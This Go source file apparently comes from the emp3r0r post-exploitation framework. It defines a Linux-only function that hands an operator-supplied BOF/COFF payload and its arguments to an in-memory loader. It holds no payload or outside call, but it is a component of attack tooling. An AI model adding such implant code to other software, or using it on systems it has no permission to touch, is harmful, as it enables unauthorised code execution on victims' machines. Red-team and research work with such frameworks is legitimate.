//go:build linux

package modules

import (
	"fmt"

	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/coffloader"
)

// runCOFFModule executes a BOF payload on Linux.
func runCOFFModule(payload []byte, invocation def.ResolvedInvocation) (string, error) {
	if invocation.Coff == nil {
		return "", fmt.Errorf("missing COFF invocation data")
	}

	args := make([]coffloader.CoffArg, 0, len(invocation.Coff.Args))
	for _, a := range invocation.Coff.Args {
		args = append(args, coffloader.CoffArg{WireType: a.WireType, Value: a.Value})
	}

	return coffloader.RunLinuxCOFF(payload, invocation.Coff.Export, args)
}
